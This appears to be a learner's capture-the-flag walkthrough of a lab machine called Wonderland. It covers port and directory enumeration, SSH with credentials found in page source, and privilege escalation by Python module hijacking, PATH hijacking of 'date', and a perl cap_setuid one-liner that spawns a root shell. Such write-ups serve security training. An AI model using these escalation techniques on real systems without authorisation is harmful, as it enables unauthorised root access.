## Machine Details
ipaddr=10.10.207.132


## Enumeration
```bash
nmap $IP -vvv -Pn -sC -sV -oN /nmapnmap-output.txt
```
Open ports
```
22
80
```
OS
```
Ubuntu
```
Port 80 is open browse to website
View source. Nothing special. No comments.
Highlight page no hidden text

try dirbuster for hidden directories
```bash
dirbuster -u http://10.10.207.132 -l /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -r
```
found directory /r
View source. Nothing special. No comments
Highlight page no hidden text

Using dirbuster we can see the sub directories
```
/r/a/b/b/i/t/
```
dirbuster seems to have stopped at the above directory

view source shows an interesting value
```
alice:HowDoxxxx
```
## TASK 
### Obtain the flag in user.txt


using the above as username:password ssh to machine

permission denied on root.txt
python file is generic

directories in ```/home``` no accessible

trying linpeas
```bash
scp /share/tryhackme/tools/linpeas/linpeas.sh alice@10.10.207.132:/dev/shm
```
had to use the hint.

Everything is upside down here.

go to ```/```

Notice folder called root

```cd``` to ```/root```

unable to ls -la in the directory

Gave in an had to go to internet to get answer.

```cat /root/user.txt``` to get the flag 

:facepalm: root.txt is in user dir and user.txt is in root dir


### Escalate your privileges, what is the flag in root.txt?

run ```sudo -l``` to list what we CAN do as alice.

Notice that python script... can be run as Rabbit

Check out the python script, cant edit it.. can view it

Python script is long but it imports Random 
random is a module in python but will also load from current directory. 

some googling took me here - https://gist.github.com/dvdknaap/190c458d2bcdc66aa937db0944caf222
Which mentions some /bin/bash in code.

also here https://gtfobins.github.io/gtfobins/python/
if i put that line into a python script, it should trigger shell as rabbit
```bash
alice@wonderland:~$ sudo -u rabbit python3 walrus_and_the_carpenter.py 
Sorry, user alice is not allowed to execute '/usr/bin/python3 walrus_and_the_carpenter.py' as rabbit on wonderland.
```
oh...

tried again with full path.. this time to python3.6 as this is in usr/bin
```bash
alice@wonderland:~$ sudo -u rabbit python3.6 /home/alice/walrus_and_the_carpenter.py
rabbit@wonderland:~$ 
```
now rabbit.

check out rabbit home directory
```bash
ls -la
```
permissions on this has a s ... something about this was mentioned in a John Hammond video. its a binary or something

run binary ```./teaParty```
```
Welcome to the tea party!
The Mad Hatter will be here soon.
Probably by Fri, 06 May 2022 15:32:07 +0000
Ask very nicely, and I will give you some tea while you wait for him
```
Disclaimer:

This is where i got lost. The rest is now from a write up

Start a simple python webserver to get the file back to our system
```python
python3 -m http.server
```
using Strings investigate the binary.

Notice the "date" variable. This is a binary that is in the users PATH

We can use that the similar as with the python module.

create a date file in the same directory as teaParty
```bash
#!bin/bash
echo ""
echo "Date Hijacked"
/bin/bash
```
save the file and chmod +x date to make it executable

now if we add our home directory to the $PATH it will search there for the "date" binary.

run the binary again to use date to get a new shell
```
rabbit@wonderland:/home/rabbit$ ./teaParty 
Welcome to the tea party!
The Mad Hatter will be here soon.
Probably by 
DATE HIJACKED
hatter@wonderland:/home/rabbit$
```
Go back to our linpeas results.

find setuid
```bash
cat /dev/shm/lin.txt | grep setui
[+] [CVE-2017-5618] setuid screen v4.5.0 LPE
/usr/bin/perl5.26.1 = cap_setuid+ep
/usr/bin/perl = cap_setuid+ep
```
check out https://gtfobins.github.io/gtfobins/perl/#capabilities

to see the command for exploiting this setuid

```perl
./perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/sh";'
```
none of these are working for me, getting permissions denied.

Decided to exit out of my hatter session and re-exploit date. Trying a different walkthrough

```bash
cd /tmp
echo /bin/sh > date
chmod 777 date
expot PATH=/tmp:$PATH
```
back to rabbit home and run teaParty again

Cannot find answer still getting permissions error.
following 

1hr of messing around... i read this on the tryhackme forum

> "hint-check ur shell theres a reason for the file in the hatters home directory"

at this point it hit me. 

su hatter

run 
```perl
perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/sh";'
```
and root.
```bash
cd /home/alice
cat root.txt
```